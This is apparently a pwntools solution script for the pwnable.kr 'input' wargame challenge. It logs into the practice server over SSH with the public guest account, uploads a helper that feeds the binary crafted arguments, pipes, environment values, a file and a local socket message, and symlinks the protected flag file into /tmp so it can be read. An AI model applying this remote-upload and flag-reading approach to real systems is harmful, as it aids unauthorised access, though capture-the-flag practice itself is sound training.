from pwn import *
import time

RUN_SCRIPT = r"""from pwn import *
import os, socket, time

argv = ['a' for i in range(100)]
r_in, w_in = os.pipe()
r_err, w_err = os.pipe()
env = {}

def stage1():
    argv[ord('A')] = '\x00'
    argv[ord('B')] = '\x20\x0a\x0d'
    argv[ord('C')] = '13145'

def stage2():
    os.write(w_in, b'\x00\x0a\x00\xff')
    os.write(w_err, b'\x00\x0a\x02\xff')
    
def stage3():
    env[b'\xde\xad\xbe\xef'] = b'\xca\xfe\xba\xbe'

def stage4():
    with open('\x0a', 'wb') as f:
        f.write(b'\x00\x00\x00\x00')
        
def stage5():
    s = socket.socket()
    s.connect(('127.0.0.1', 13145))
    s.send(b'\xde\xad\xbe\xef')
    
stage1()
stage2()
stage3()
stage4()

p = process(executable = './input', argv = argv, stdin = r_in, stderr = r_err, env = env)

time.sleep(0.5)
stage5()

p.recvuntil("5 clear!\n")
flag = p.recvline().decode().strip()
print(f"Flag is: {flag}")
"""

REMOTE_ADDRESS = "pwnable.kr"
REMOTE_PORT = 2222
REMOTE_USERNAME = "input2"
REMOTE_PASSWORD = "guest"
FILE_DIR = "/tmp/input_{}".format(time.strftime("%Y%m%d", time.localtime()))

shell = ssh(host = REMOTE_ADDRESS, port = REMOTE_PORT, user = REMOTE_USERNAME, password = REMOTE_PASSWORD)
sh = shell.run("/bin/sh")

sh.sendline(f"mkdir {FILE_DIR}".encode())
shell.upload_data(RUN_SCRIPT.encode(), f"{FILE_DIR}/run.py".encode())
sh.sendline(f"ln -s /home/input2/input {FILE_DIR}/input".encode())
sh.sendline(f"ln -s /home/input2/flag {FILE_DIR}/flag".encode())

sh.close()
shell.close()

print(f"Please ssh remote machine, then change the directory to {FILE_DIR}, and finally execute 'python run.py'.")